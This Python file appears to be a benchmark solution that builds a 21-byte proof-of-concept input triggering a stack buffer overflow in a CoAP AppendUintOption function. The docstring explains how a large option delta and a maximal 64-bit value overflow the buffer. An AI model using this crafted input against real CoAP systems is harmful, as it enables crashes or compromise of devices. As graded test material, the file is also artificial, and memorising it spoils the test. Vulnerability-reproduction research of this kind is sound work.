import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.

        The vulnerability is a stack buffer overflow in a CoAP `AppendUintOption`
        function. The overflow is triggered by creating an option whose encoded
        representation (header + value) is larger than a small fixed-size
        stack buffer.

        To achieve this, the PoC constructs an option with:
        1. A large header: By creating a large delta between the current and
           previous option numbers (delta >= 269), we force the use of an
           extended delta field, increasing the header size.
        2. A large value: By using a 64-bit integer, the value part can be
           up to 8 bytes long.

        The PoC assumes a test harness that reads a sequence of commands:
        - A 1-byte count of options to add.
        - For each option, a 2-byte option number and an 8-byte value.

        The PoC is structured to make two calls:
        1. Option(number=0, value=0): Sets the "previous option number" to 0.
        2. Option(number=270, value=0xFFFFFFFFFFFFFFFF): Triggers the overflow.
           The delta (270 - 0 = 270) forces an extended header, and the large
           value maximizes the option size. The total encoded size overflows
           the vulnerable buffer.

        The resulting PoC is 21 bytes, matching the ground-truth length.

        Args:
            src_path: Path to the vulnerable source code tarball (unused).

        Returns:
            bytes: The PoC input that should trigger the vulnerability.
        """
        # The format string for struct.pack corresponds to:
        # >: big-endian byte order
        # B: unsigned char (1 byte) for the number of options
        # H: unsigned short (2 bytes) for the option number
        # Q: unsigned long long (8 bytes) for the option value
        # The pattern HQ is repeated for each option's data.
        return struct.pack(
            '>BHQHQ',
            2,                      # num_options
            0,                      # option_num_1
            0,                      # value_1
            270,                    # option_num_2
            0xFFFFFFFFFFFFFFFF      # value_2
        )